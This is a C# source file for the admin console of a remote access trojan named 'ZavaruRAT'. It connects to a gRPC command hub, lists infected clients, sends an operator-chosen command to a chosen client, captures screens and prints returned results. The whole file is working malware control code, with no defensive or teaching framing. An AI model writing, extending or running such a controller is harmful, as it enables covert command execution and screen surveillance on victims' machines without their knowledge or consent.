#region

using Google.Protobuf.WellKnownTypes;
using Grpc.Core;
using Grpc.Net.Client;
using MessagePack;
using ZavaruRAT.Admin.CommandHandlers;
using ZavaruRAT.Proto;

#endregion

var channel = GrpcChannel.ForAddress("https://localhost:5001");
var adminClient = new AdminHub.AdminHubClient(channel);

var commandHandlers = new List<CommandHandler>
{
    new ScreenCapture(adminClient)
};

async Task ExecuteClientCommand()
{
    Console.Clear();

    var stats = adminClient.NetworkStatistics(new Empty());
    Console.WriteLine($"Nodes: {stats.Nodes}, clients: {stats.Clients}");
    Console.WriteLine();

    // wait until someone connects
    if (stats.Clients == 0)
    {
        Thread.Sleep(1000);
        return;
    }

    Console.Write("Client ID > ");
    var clientId = Console.ReadLine()!;

    var clientExists = adminClient.ClientExists(new ClientExistsRequest
    {
        ClientId = clientId
    });

    if (!clientExists.Exists)
    {
        Console.WriteLine("Client does not exist.");
        Console.ReadKey();
        return;
    }

    Console.Write("Command   > ");
    var command = Console.ReadLine()!;

    Console.WriteLine();

    // todo: arguments

    var hashId = Guid.NewGuid().ToString();
    var results = adminClient.CommandResults(new CommandResultsRequest
    {
        HashId = hashId
    });

    adminClient.InvokeCommand(new InvokeCommandRequest
    {
        ClientId = clientId,
        HashId = hashId,
        Command = command
    });

    Console.WriteLine("Waiting for {0} result", hashId);


    var handled = false;
    foreach (var handler in commandHandlers)
    {
        if (handler.Match(command.ToLower()))
        {
            await handler.Handle(hashId, clientId, results);
            handled = true;
            break;
        }
    }

    if (handled)
    {
        return;
    }

    await foreach (var commandResult in results.ResponseStream.ReadAllAsync())
    {
        Console.WriteLine();
        Console.WriteLine();
        Console.WriteLine(commandResult);

        try
        {
            var obj = MessagePackSerializer.Typeless.Deserialize(commandResult.Result.ToByteArray());
            Console.WriteLine(obj);
        }
        catch (Exception e)
        {
            Console.WriteLine("Unable to deserialize result");
            Console.WriteLine(e);
        }

        results.Dispose();

        break;
    }

    Console.WriteLine();
    Console.WriteLine();
    Console.WriteLine();
    Console.WriteLine();
}

while (true)
{
    Console.Clear();

    Console.WriteLine("ZavaruRAT Admin");
    Console.WriteLine("===============");
    Console.WriteLine();
    Console.WriteLine("1. Execute command on a specified client");
    Console.WriteLine("2. Exit");

    var key = Console.ReadKey(true);

    switch (key.Key)
    {
        case ConsoleKey.D1:
            await ExecuteClientCommand();
            break;
        case ConsoleKey.D2:
            return;
    }

    Thread.Sleep(5000);
}
